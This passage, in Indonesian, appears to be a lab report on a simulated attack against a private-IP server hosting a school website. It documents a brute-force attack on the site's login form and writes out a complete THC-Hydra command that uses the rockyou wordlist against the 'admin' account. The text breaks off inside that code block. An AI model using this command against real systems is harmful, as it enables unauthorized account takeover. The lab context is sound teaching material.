### 📝 Analisis dan Pembahasan Eksekusi

Pada tahapan ini, dilakukan simulasi serangan ofensif (**Phase 2 - Attack**) terhadap server target `192.168.2.10` yang menghosting situs web `sman1nusantara.com`. Berikut adalah rincian aktivitas yang terekam pada dokumentasi di atas:

#### 1. Eksekusi Serangan Ofensif (Terminal Kanan - THC-Hydra)
* **Metode Serangan:** *Brute Force Attack* terhadap form login HTTP POST (`http-form-post`).
* **Tools yang Digunakan:** `Hydra v9.2`
* **Perintah yang Dijalankan:** ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.2.10 http-form-post "/login.php:user=^USER^&pass=^PASS^:F=Login Failed"
